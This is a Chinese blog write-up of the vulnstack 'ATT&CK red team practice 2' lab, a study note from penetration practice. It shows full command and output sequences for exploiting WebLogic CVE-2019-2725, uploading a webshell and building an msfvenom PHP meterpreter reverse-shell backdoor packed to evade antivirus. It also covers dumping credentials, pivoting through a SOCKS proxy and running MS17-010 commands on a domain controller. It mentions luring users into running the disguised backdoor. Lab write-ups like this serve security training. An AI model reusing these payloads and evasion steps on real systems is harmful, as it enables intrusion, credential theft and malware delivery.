---
title: ATT&cK实战系列—红队实战(二)
date: 2022-09-10
tags:
 - 网络安全
categories:
 - 学习笔记
---


## 环境搭建

[漏洞详情 (qiyuanxuetang.net)](http://vulnstack.qiyuanxuetang.net/vuln/detail/3/)

拓扑：

![img](./st2.assets/tuopu.jpg)

### 环境说明

网络配置：

![image-20220902201716802](./st2.assets/image-20220902201716802.png)

![image-20220902221502005](./st2.assets/image-20220902221502005.png)

内网网段：10.10.10.1/24

DMZ网段：192.168.211.1/24

测试机地址：192.168.211.147（Kali Linux）

防火墙策略（策略设置过后，测试机只能访问192段地址，模拟公网访问）：

```
deny all tcp ports：10.10.10.1
allow all tcp ports：10.10.10.0/24
```



### Web 机密码错误问题

根据网上资料显示，可恢复快照到 V1.3 解决。

但是，恢复快照就没意思了，所以用另一种方法，进PE直接把密码给改了：

![image-20220902224528402](./st2.assets/image-20220902224528402.png)



重启，一个不留神进磁盘检测了，让他扫算了。~~然而我虚拟机还是在NAS上的不在本地。。。~~

![image-20220902224701716](./st2.assets/image-20220902224701716.png)

进来了

![image-20220902225317616](./st2.assets/image-20220902225317616.png)



### Web 服务配置

Web机器中启用 Web 服务

> C:\Oracle\Middleware\user_projects\domains\base_domain\bin\stopWebLogic.cmd   ( Request Admin)

![image-20220903163549673](./st2.assets/image-20220903163549673.png)

![image-20220903164500501](./st2.assets/image-20220903164500501.png)



Kali 中尝试访问：

![image-20220903164404229](./st2.assets/image-20220903164404229.png)



### 环境确认

看IP，并确认网络状态正常。

> Kali: 192.168.111.128
>
> Web: 192.168.111.80, 10.10.10.80
>
> PC: 192.168.111.201, 10.10.10.201
>
> DC: 10.10.10.10



![image-20220902232152055](./st2.assets/image-20220902232152055.png)

![image-20220902231847909](./st2.assets/image-20220902231847909.png)

![image-20220902231857759](./st2.assets/image-20220902231857759.png)



## 信息收集

nmap 扫一下 Web 看看

```bash
┌──(root㉿kali)-[/home/kali]
└─# nmap -sS -v 192.168.111.80

Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-03 04:45 EDT
Initiating ARP Ping Scan at 04:45
Scanning 192.168.111.80 [1 port]
Completed ARP Ping Scan at 04:45, 0.22s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 04:45
Completed Parallel DNS resolution of 1 host. at 04:45, 0.01s elapsed
Initiating SYN Stealth Scan at 04:45
Scanning 192.168.111.80 (192.168.111.80) [1000 ports]
Discovered open port 445/tcp on 192.168.111.80
Discovered open port 139/tcp on 192.168.111.80
Discovered open port 3389/tcp on 192.168.111.80
Discovered open port 135/tcp on 192.168.111.80
Discovered open port 80/tcp on 192.168.111.80
Discovered open port 49154/tcp on 192.168.111.80
Discovered open port 7001/tcp on 192.168.111.80
Discovered open port 49152/tcp on 192.168.111.80
Discovered open port 49155/tcp on 192.168.111.80
Discovered open port 49153/tcp on 192.168.111.80
Discovered open port 1433/tcp on 192.168.111.80
Completed SYN Stealth Scan at 04:46, 4.13s elapsed (1000 total ports)
Nmap scan report for 192.168.111.80 (192.168.111.80)
Host is up (0.00031s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
1433/tcp  open  ms-sql-s
3389/tcp  open  ms-wbt-server
7001/tcp  open  afs3-callback
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
MAC Address: 00:0C:29:5A:92:F5 (VMware)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 4.50 seconds
           Raw packets sent: 1990 (87.544KB) | Rcvd: 12 (512B)
```

可见 80、135、139、445、1433、3389、7001、49152、49153、49154 端口处于启用状态



**端口分析**

- 445 端口开放意味着存在 smb 服务，可能存在ms17_010永恒之蓝漏洞。
- 139 端口，就存在 Samba 服务，可能存在爆破/未授权访问/远程命令执行漏洞。
- 1433 端口，就存在 mssql 服务，可能存在爆破/注入/SA弱口令。
- 7001 端口可能存在 Weblogic 反序列化漏洞。



前面访问80端口的时候可见，里面是空白的没有内容，那直接试试扫7001的 Weblogic 看看有没有漏洞。

工具：[dr0op/WeblogicScan: 增强版WeblogicScan、检测结果更精确、插件化、添加CVE-2019-2618，CVE-2019-2729检测，Python3支持 (github.com)](https://github.com/dr0op/WeblogicScan)

> 也可以使用 AWVS

```bash
┌──(root㉿kali)-[/home/kali/Documents/Git/WeblogicScan]
└─# python3 WeblogicScan.py 192.168.111.80 7001

__        __   _     _             _        ____                  
\ \      / /__| |__ | | ___   __ _(_) ___  / ___|  ___ __ _ _ __  
 \ \ /\ / / _ \ '_ \| |/ _ \ / _` | |/ __| \___ \ / __/ _` | '_ \ 
  \ V  V /  __/ |_) | | (_) | (_| | | (__   ___) | (_| (_| | | | |
   \_/\_/ \___|_.__/|_|\___/ \__, |_|\___| |____/ \___\__,_|_| |_|
                             |___/ 
      From WeblogicScan V1.2 Fixed by Ra1ndr0op: drops.org.cn | V 1.3.1 

Welcome To WeblogicScan !!
[*]开始检测 weblogic-console
[+]The target Weblogic console address is exposed!
[+]The path is: http://192.168.111.80:7001/console/login/LoginForm.jsp
[+]Please try weak password blasting!
[+]Weblogic后台路径存在
[*]开始检测 SSRF
[+]The target Weblogic UDDI module is exposed!
[+]The path is: http://192.168.111.80:7001/uddiexplorer/
[+]Please verify the SSRF vulnerability!
[+]SSRF 漏洞存在
[*]开始检测 CVE20192725
[+]The target weblogic has a JAVA deserialization vulnerability:CVE-2019-2725
[+]CVE-2019-2725 漏洞存在
[*]开始检测 CVE20192729
[-]CVE20192729 未成功检测，请检查网络连接或或目标存在负载中间件
[*]开始检测 CVE201710271
[-]Target weblogic not detected CVE-2017-10271
[*]开始检测 CVE20173506
[-]Target weblogic not detected CVE-2017-3506
[*]开始检测 CVE20192618
[-]口令爆破失败：weblogic/weblogic
[-]口令爆破失败：weblogic/weblogic1
[-]口令爆破失败：weblogic/weblogic10
[-]口令爆破失败：weblogic/weblogic123
[-]口令爆破失败：weblogic/Oracle@123
[-]target Weblogic is not Vul CVE-2019-2618
[*]开始检测 CVE20182894
[-]Target weblogic not detected CVE-2018-2894
[*]开始检测 CVE20182628
[-]CVE20182628 未成功检测，请检查网络连接或或目标存在负载中间件
[*]开始检测 CVE20182893
[-]CVE20182893 未成功检测，请检查网络连接或或目标存在负载中间件
[*]开始检测 CVE20160638
[-]Target weblogic not detected CVE-2016-0638
[*]开始检测 CVE20163510
[-]Target weblogic not detected CVE-2016-3510
[*]开始检测 CVE20173248
[-]Target weblogic not detected CVE-2017-3248
```



有几个检测失败了，返回去 Web 一看，原来是被 360 拦了

![image-20220903203027582](./st2.assets/image-20220903203027582.png)



不过没关系，不是还有几个能用的，就从这几个入手吧

```
[*]开始检测 SSRF
[+]The target Weblogic UDDI module is exposed!
[+]The path is: http://192.168.111.80:7001/uddiexplorer/
[+]Please verify the SSRF vulnerability!
[+]SSRF 漏洞存在

[*]开始检测 CVE20192725
[+]The target weblogic has a JAVA deserialization vulnerability:CVE-2019-2725
[+]CVE-2019-2725 漏洞存在

[*]开始检测 CVE20192729
[+]The target weblogic has a JAVA deserialization vulnerability:CVE-2019-2729
[+]CVE-2019-2729 漏洞存在

[*]开始检测 CVE20173506
[+]The target weblogic has a JAVA deserialization vulnerability:CVE-2017-3506
[+]CVE-2017-3506 漏洞存在
```



### 后台

访问看一眼：http://192.168.111.80:7001/console/login/LoginForm.jsp

随便试几个弱密码，失败；

到网上搜默认密码，失败：

![image-20220904154513063](./st2.assets/image-20220904154513063.png)

至于爆破，就算了吧。



### SSRF 

到目录里看一下：

![image-20220903203424470](./st2.assets/image-20220903203424470.png)



到 Search Public Registries 里 Search 一下，并抓包看看

![image-20220903212150178](./st2.assets/image-20220903212150178.png)

![image-20220903212428237](./st2.assets/image-20220903212428237.png)



看起来 operator 是可更改的参数，更改后可以引起不同的报错

![image-20220903213155825](./st2.assets/image-20220903213155825.png)

![image-20220903213352928](./st2.assets/image-20220903213352928.png)



### CVE-2019-2725

#### MSF

```bash
msf6 > search weblogic_des

Matching Modules
================

   #  Name                                                          Disclosure Date  Rank       Check  Description
   -  ----                                                          ---------------  ----       -----  -----------
   0  exploit/multi/misc/weblogic_deserialize                       2018-04-17       manual     Yes    Oracle Weblogic Server Deserialization RCE
   1  exploit/multi/misc/weblogic_deserialize_asyncresponseservice  2019-04-23       excellent  Yes    Oracle Weblogic Server Deserialization RCE - AsyncResponseService
   2  exploit/multi/misc/weblogic_deserialize_marshalledobject      2016-07-19       manual     No     Oracle Weblogic Server Deserialization RCE - MarshalledObject
   3  exploit/multi/misc/weblogic_deserialize_unicastref            2017-01-25       excellent  No     Oracle Weblogic Server Deserialization RCE - RMI UnicastRef
   4  exploit/multi/misc/weblogic_deserialize_rawobject             2015-01-28       excellent  No     Oracle Weblogic Server Deserialization RCE - Raw Object
   5  exploit/multi/misc/weblogic_deserialize_badattrval            2020-01-15       normal     Yes    WebLogic Server Deserialization RCE - BadAttributeValueExpException
   6  exploit/multi/misc/weblogic_deserialize_badattr_extcomp       2020-04-30       normal     Yes    WebLogic Server Deserialization RCE BadAttributeValueExpException ExtComp


Interact with a module by name or index. For example info 6, use 6 or use exploit/multi/misc/weblogic_deserialize_badattr_extcomp

msf6 > use xploit/multi/misc/weblogic_deserialize_asyncresponseservice
[*] Using configured payload cmd/unix/reverse_bash

Matching Modules
================

   #  Name                                                          Disclosure Date  Rank       Check  Description
   -  ----                                                          ---------------  ----       -----  -----------
   0  exploit/multi/misc/weblogic_deserialize_asyncresponseservice  2019-04-23       excellent  Yes    Oracle Weblogic Server Deserialization RCE - AsyncResponseService


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/misc/weblogic_deserialize_asyncresponseservice                                                                                                                                    

[*] Using exploit/multi/misc/weblogic_deserialize_asyncresponseservice
msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > info

       Name: Oracle Weblogic Server Deserialization RCE - AsyncResponseService 
     Module: exploit/multi/misc/weblogic_deserialize_asyncresponseservice
   Platform: Unix, Windows, Solaris
       Arch: 
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2019-04-23

Provided by:
  Andres Rodriguez - 2Secure (@acamro) <acamro@gmail.com>

Available targets:
  Id  Name
  --  ----
  0   Unix
  1   Windows
  2   Solaris

Check supported:
  Yes

Basic options:
  Name       Current Setting               Required  Description
  ----       ---------------               --------  -----------
  Proxies                                  no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS                                   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Us
                                                     ing-Metasploit
  RPORT      7001                          yes       The target port (TCP)
  SSL        false                         no        Negotiate SSL/TLS for outgoing connections
  TARGETURI  /_async/AsyncResponseService  yes       URL to AsyncResponseService
  VHOST                                    no        HTTP server virtual host

Payload information:

Description:
  An unauthenticated attacker with network access to the Oracle 
  Weblogic Server T3 interface can send a malicious SOAP request to 
  the interface WLS AsyncResponseService to execute code on the 
  vulnerable host.

References:
  https://nvd.nist.gov/vuln/detail/CVE-2017-10271
  CNVD-C (2019-48814)
  http://www.cnvd.org.cn/webinfo/show/4999
  https://www.oracle.com/technetwork/security-advisory/alert-cve-2019-2725-5466295.html
  https://twitter.com/F5Labs/status/1120822404568244224

```

```bash
msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > set rhosts 192.168.111.80
rhosts => 192.168.111.80
msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > set lhost 192.168.111.128
lhost => 192.168.111.128
msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > set target Windows
target => Windows
msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > options 

Module options (exploit/multi/misc/weblogic_deserialize_asyncresponseservice):

   Name       Current Setting               Required  Description
   ----       ---------------               --------  -----------
   Proxies                                  no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     192.168.111.80                yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/U
                                                      sing-Metasploit
   RPORT      7001                          yes       The target port (TCP)
   SSL        false                         no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /_async/AsyncResponseService  yes       URL to AsyncResponseService
   VHOST                                    no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.111.128  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   Windows


msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > run

[*] Started reverse TCP handler on 192.168.111.128:4444 
[*] Generating payload...
[*] Sending payload...
[*] Exploit completed, but no session was created.

```



失败，360 拦下来了

![image-20220904160410608](./st2.assets/image-20220904160410608.png)



#### 漏洞 WebShell

##### Java反序列化漏洞利用工具 + 冰蝎 反弹 Shell

tasklist 发现 360

![image-20220904163431356](./st2.assets/image-20220904163431356.png)

![image-20220904163651371](./st2.assets/image-20220904163651371.png)



将 [冰蝎](https://github.com/rebeyond/Behinder) 的Server传上WEB

> Requset [JRE](https://www.oracle.com/java/technologies/downloads/) 1.8+

![image-20220905193231829](./st2.assets/image-20220905193231829.png)

冰蝎连接，成功：

![image-20220905193450444](./st2.assets/image-20220905193450444.png)



看看系统信息

![image-20220906012948157](./st2.assets/image-20220906012948157.png)

Shell 也返回成功了

![image-20220906013521880](./st2.assets/image-20220906013521880.png)



##### MSF 反弹 Shell

生成 PHP 后门

```php
┌──(root㉿kali)-[/home/kali]
└─# msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.111.128 lport=9999 -f raw >houmen.php                              
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 1116 bytes
```

![image-20220906013850233](./st2.assets/image-20220906013850233.png)



构造免杀

工具：[Release bamcompile1.21.zip · xZero707/Bamcompile (github.com)](https://github.com/xZero707/Bamcompile)

```powershell
PS D:\ProgramOthers\Security\bamcompile1.21> .\bamcompile.exe -w -c .\houmen.php .\miansha.exe

Bambalam PHP EXE Compiler/Embedder 1.21

Windowed application
Compress
Mainfile: .\houmen.php
Outfile: .\miansha.exe

Encoding and embedding .\houmen.php
Compressing final exe..
Compression done

.\miansha.exe created successfully!
```

得到免杀 EXE

![image-20220906014757932](./st2.assets/image-20220906014757932.png)

将其上传到 WEB 中，然后开启监听，运行miasha.exe，成功反弹

```bash
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > options 

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > set lhost 192.168.111.128
lhost => 192.168.111.128
msf6 exploit(multi/handler) > set lport 9999
lport => 9999
msf6 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.111.128:9999 
[*] Sending stage (39282 bytes) to 192.168.111.80
[*] Meterpreter session 3 opened (192.168.111.128:9999 -> 192.168.111.80:53897 ) at 2022-09-05 13:54:37 -0400

meterpreter >
```



##### CS

新建监听器

![image-20220906235842928](./st2.assets/image-20220906235842928.png)



生成后门

![image-20220906155511478](./st2.assets/image-20220906155511478.png)



上传后门

![image-20220906235950361](./st2.assets/image-20220906235950361.png)



~~怪了这360怎么一点反应都没有~~

运行起来就有反应了

![image-20220907000127567](./st2.assets/image-20220907000127567.png)



用 BypassAV, Restorator，再加壳，手动云查杀一下看看结果：

![image-20220907153445579](./st2.assets/image-20220907153445579.png)



试了几种方法，得出了个不知道严不严谨的结论

> 后门得用户自己打开才行（不会报毒）
>
> 远程执行就算是绕着几个弯也还是会报入侵服务器



那就暂时先模拟诱惑用户主动点击吧，毕竟可以伪造成日用软件。（当然，也可以用 MSF 派生 CS Shell）

双击打开 云查杀也不报毒的 artifact1.exe

成功反弹

![image-20220907155321492](./st2.assets/image-20220907155321492.png)



提权

![image-20220907162927468](./st2.assets/image-20220907162927468.png)



### 信息收集

#### 抓取明文密码

```
hashdump
logonpasswords
```

![image-20220907163238560](./st2.assets/image-20220907163238560.png)



#### 主机信息

> 常用命令
>
> systeminfo  				//查看操作系统信息
> ipconfig /all  				//查询本机ip段，所在域等
> whoami   					//查看当前用户权限
> net user						//查看本地用户
> net localgroup administrators	//查看本地管理员组(通常 包含域用户)



系统信息

![image-20220908182619727](./st2.assets/image-20220908182619727.png)



IP 信息

![image-20220908183702411](./st2.assets/image-20220908183702411.png)

两个网络

> 192.168.111.80
>
> 10.10.10.80



还是 MSF 用着顺手，用冰蝎反弹 Shell 过去

![image-20220908184546973](./st2.assets/image-20220908184546973.png)



#### 域信息收集

> 常用命令：
>
> net config workstation     				// 查看当前计算机名，全名，用户名，系统版本，工作站域，登陆的域等
> net view /domain              				// 查看域
> net time /domain          					// 主域服务器会同时作为时间服务器
> net user /domain      						// 查看域用户
> net group /domain							// 查看域内用户组列表
> net group "domain computers" /domain      	// 查看域内的机器
> net group "domain controllers" /domain          // 查看域控制器组
> net group "Enterprise Admins" /domain   		// 查看域管理员组



域配置

```bash
c:\>net config workstation
net config workstation
Computer name                        \\WEB
Full Computer name                   WEB.de1ay.com
User name                            de1ay

Workstation active on                
        NetBT_Tcpip_{D7E14072-49B9-45D3-BA8C-7955E6146CC2} (000C295A92F5)
        NetBT_Tcpip_{AD80CD23-D97F-4814-A715-9248D845EA0F} (000C295A92FF)

Software version                     Windows Server 2008 R2 Standard

Workstation domain                   DE1AY
Workstation Domain DNS Name          de1ay.com
Logon domain                         WEB

COM Open Timeout (sec)               0
COM Send Count (byte)                32
COM Send Timeout (msec)              250
The command completed successfully.
```



域内用户组

```bash
C:\>net group /domain
net group /domain
The request will be processed at a domain controller for domain de1ay.com.


Group Accounts for \\DC.de1ay.com

-------------------------------------------------------------------------------
*Cloneable Domain Controllers
*DnsUpdateProxy
*Domain Admins
*Domain Computers
*Domain Controllers
*Domain Guests
*Domain Users
*Enterprise Admins
*Enterprise Read-only Domain Controllers
*Group Policy Creator Owners
*Protected Users
*Read-only Domain Controllers
*Schema Admins
The command completed successfully.
```



域用户

```bash
C:\>net user /domain
net user /domain
The request will be processed at a domain controller for domain de1ay.com.


User accounts for \\DC.de1ay.com

-------------------------------------------------------------------------------
Administrator            de1ay                    Guest                    
krbtgt                   mssql                    
The command completed successfully.
```



域内机器

```bash
C:\>net group "domain computers" /domain
net group "domain computers" /domain
The request will be processed at a domain controller for domain de1ay.com.

Group name     Domain Computers
Comment        ���뵽���е����й���վ�ͷ�����

Members

-------------------------------------------------------------------------------
PC$                      WEB$                     
The command completed successfully.
```

> PC
>
> WEB



域控

```bash
C:\>net group "domain controllers" /domain
net group "domain controllers" /domain
The request will be processed at a domain controller for domain de1ay.com.

Group name     Domain Controllers
Comment        ����������������

Members

-------------------------------------------------------------------------------
DC$                      
The command completed successfully.
```

> DC



### 横向移动

#### 设置代理

> 确保已在 MSF 中 get shell

添加路由

> 手工添加：run autoroute -s 192.168.52.0/24		#添加路由
> 		 		run autoroute -p									#查看路由
> 自动添加：run post/multi/manage/autoroute

> 查看路由表：run autoroute -p

自动添加失败：

```bash
meterpreter > run post/multi/manage/autoroute

[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: windows
[*] Running module against WEB
[*] Searching for subnets to autoroute.
[*] Did not find any new subnets to add.
meterpreter > run autoroute -p

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] No routes have been added yet
```



手动添加

```bash
meterpreter > run autoroute -s 10.10.10.0/24

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 10.10.10.0/255.255.255.0...
[+] Added route to 10.10.10.0/255.255.255.0 via 192.168.111.80
[*] Use the -p option to list all active routes
meterpreter > run autoroute -p

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]

Active Routing Table
====================

   Subnet             Netmask            Gateway
   ------             -------            -------
   10.10.10.0         255.255.255.0      Session 1
```



设置代理

```bash
meterpreter > background 
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > options 

Module options (auxiliary/server/socks_proxy):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        Proxy password for SOCKS5 listener
   SRVHOST   0.0.0.0          yes       The address to listen on
   SRVPORT   1080             yes       The port to listen on
   USERNAME                   no        Proxy username for SOCKS5 listener
   VERSION   5                yes       The SOCKS version to use (Accepted: 4a, 5)


Auxiliary action:

   Name   Description
   ----   -----------
   Proxy  Run a SOCKS proxy server


msf6 auxiliary(server/socks_proxy) > set srvhost 127.0.0.1
srvhost => 127.0.0.1
msf6 auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 0.

[*] Starting the SOCKS proxy server
```



发现设置的代理无法使用，重启了下代理，直接起不来了。。。

```bash
msf6 auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 259.

[*] Starting the SOCKS proxy server
[*] Stopping the SOCKS proxy server
```



重来一次，好了：（换了个Payload：`windows/meterpreter/reverse_tcp`）

```
meterpreter > run post/multi/manage/autoroute

[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: windows
[*] Running module against WEB
[*] Searching for subnets to autoroute.
[+] Route added to subnet 10.10.10.0/255.255.255.0 from host's routing table.
[+] Route added to subnet 192.168.111.0/255.255.255.0 from host's routing table.

meterpreter > run autoroute -p

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]

Active Routing Table
====================

   Subnet             Netmask            Gateway
   ------             -------            -------
   10.10.10.0         255.255.255.0      Session 1
   192.168.111.0      255.255.255.0      Session 1

```



#### ARP扫一下

```bash
meterpreter > run post/windows/gather/arp_scanner RHOSTS=10.10.10.0/24

[*] Running module against WEB
[*] ARP Scanning 10.10.10.0/24
[+]     IP: 10.10.10.10 MAC 00:0c:29:38:c3:bc (VMware, Inc.)
[+]     IP: 10.10.10.80 MAC 00:0c:29:5a:92:ff (VMware, Inc.)
[+]     IP: 10.10.10.201 MAC 00:0c:29:71:5d:13 (VMware, Inc.)
[+]     IP: 10.10.10.255 MAC 00:0c:29:5a:92:ff (VMware, Inc.)
[+]     IP: 10.10.10.254 MAC 00:50:56:fa:a2:7c (VMware, Inc.)
```



#### 存活主机扫描

```bash
msf6 auxiliary(server/socks_proxy) > use auxiliary/scanner/netbios/nbname
msf6 auxiliary(scanner/netbios/nbname) > options 

Module options (auxiliary/scanner/netbios/nbname):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   BATCHSIZE  256              yes       The number of hosts to probe in each set
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasplo
                                         it
   RPORT      137              yes       The target port (UDP)
   THREADS    10               yes       The number of concurrent threads

msf6 auxiliary(scanner/netbios/nbname) > set rhosts 10.10.10.0/24
rhosts => 10.10.10.0/24
msf6 auxiliary(scanner/netbios/nbname) > run

[*] Sending NetBIOS requests to 10.10.10.0->10.10.10.255 (256 hosts)
[+] 10.10.10.10 [DC] OS:Windows Names:(DC, DE1AY) Addresses:(10.10.10.10) Mac:00:0c:29:38:c3:bc Virtual Machine:VMWare
[+] 10.10.10.80 [WEB] OS:Windows Names:(WEB, DE1AY)  Mac:00:0c:29:5a:92:ff Virtual Machine:VMWare
[*] Scanned 256 of 256 hosts (100% complete)
[*] Auxiliary module execution completed

```

> 少了一台 201。
>
> DC 10.10.10.10 



#### nmap扫描

```
proxychains4 nmap -p 1-1000 -Pn -sT [IP_address]
```

DC：

![image-20220909000002317](./st2.assets/image-20220909000002317.png)

201：

![image-20220909000024118](./st2.assets/image-20220909000024118.png)



> 都开了445，看看版本号



#### 查版本号

```
msf6 auxiliary(server/socks_proxy) > use auxiliary/scanner/smb/smb_version 
msf6 auxiliary(scanner/smb/smb_version) > options 

Module options (auxiliary/scanner/smb/smb_version):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   THREADS  1                yes       The number of concurrent threads (max one per host)

msf6 auxiliary(scanner/smb/smb_version) > set rhosts 10.10.10.201
rhosts => 10.10.10.201
msf6 auxiliary(scanner/smb/smb_version) > run

[*] 10.10.10.201:445      - SMB Detected (versions:1, 2) (preferred dialect:SMB 2.1) (signatures:optional) (uptime:3d 8h 33m 53s) (guid:{7c9d6895-d9a9-4cfa-b238-a99d5aec207c}) (authentication domain:DE1AY)
[+] 10.10.10.201:445      -   Host is running Windows 7 Ultimate SP1 (build:7601) (name:PC) (domain:DE1AY)
[*] 10.10.10.201:         - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/smb/smb_version) > set rhosts 10.10.10.10
rhosts => 10.10.10.10
msf6 auxiliary(scanner/smb/smb_version) > run

[*] 10.10.10.10:445       - SMB Detected (versions:1, 2, 3) (preferred dialect:SMB 3.0.2) (signatures:required) (uptime:6h 31m 35s) (guid:{5058d13b-deb5-4f11-b8ba-8cf79f7275f1}) (authentication domain:DE1AY)
[+] 10.10.10.10:445       -   Host is running Windows 2012 R2 Standard (build:9600) (name:DC) (domain:DE1AY)
[*] 10.10.10.10:          - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

> 201 PC: Win7
>
> 10 DC: Win S 2012 R2



#### MS17_010

上面两台均可利用入侵，以DC为例：

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > use auxiliary/admin/smb/ms17_010_command
msf6 auxiliary(admin/smb/ms17_010_command) > options 

Module options (auxiliary/admin/smb/ms17_010_command):

   Name                  Current Setting                     Required  Description
   ----                  ---------------                     --------  -----------
   COMMAND               net group "Domain Admins" /domain   yes       The command you want to execute on the remote host
   DBGTRACE              false                               yes       Show extra debug trace info
   LEAKATTEMPTS          99                                  yes       How many times to try to leak transaction
   NAMEDPIPE                                                 no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/da  yes       List of named pipes to check
                         ta/wordlists/named_pipes.txt
   RHOSTS                                                    yes       The target host(s), see https://github.com/rapid7/metasploit
                                                                       -framework/wiki/Using-Metasploit
   RPORT                 445                                 yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                       no        Service description to to be used on target for pretty listi
                                                                       ng
   SERVICE_DISPLAY_NAME                                      no        The service display name
   SERVICE_NAME                                              no        The service name
   SMBDomain             .                                   no        The Windows domain to use for authentication
   SMBPass                                                   no        The password for the specified username
   SMBSHARE              C$                                  yes       The name of a writeable share on the server
   SMBUser                                                   no        The username to authenticate as
   THREADS               1                                   yes       The number of concurrent threads (max one per host)
   WINPATH               WINDOWS                             yes       The name of the remote Windows directory

msf6 auxiliary(admin/smb/ms17_010_command) > set command "ipconfig"
command => ipconfig
msf6 auxiliary(admin/smb/ms17_010_command) > set rhosts 10.10.10.10
rhosts => 10.10.10.10
msf6 auxiliary(admin/smb/ms17_010_command) > run

[*] 10.10.10.10:445       - Target OS: Windows Server 2012 R2 Standard 9600
[*] 10.10.10.10:445       - Built a write-what-where primitive...
[+] 10.10.10.10:445       - Overwrite complete... SYSTEM session obtained!
[+] 10.10.10.10:445       - Service start timed out, OK if running a command or non-service executable...
[*] 10.10.10.10:445       - Getting the command output...
[*] 10.10.10.10:445       - Executing cleanup...
[+] 10.10.10.10:445       - Cleanup was successful
[+] 10.10.10.10:445       - Command completed successfully!
[*] 10.10.10.10:445       - Output for "ipconfig":


Windows IP ����


���������� Ethernet0:

   �����ض��� DNS ��׺ . . . . . . . : 
   �������� IPv6 ��. . . . . . . . : fe80::fa:a5d5:4ccb:b522%12
   IPv4 �� . . . . . . . . . . . . : 10.10.10.10
   ��������  . . . . . . . . . . . . : 255.255.255.0
   Ĭ������. . . . . . . . . . . . . : 10.10.10.1

���������� isatap.{A5CDA27E-AD13-448E-9EAA-DACE69D64EAE}:

   ý��״  . . . . . . . . . . . . : ý���ѶϿ�
   �����ض��� DNS ��׺ . . . . . . . : 


[*] 10.10.10.10:445       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```



























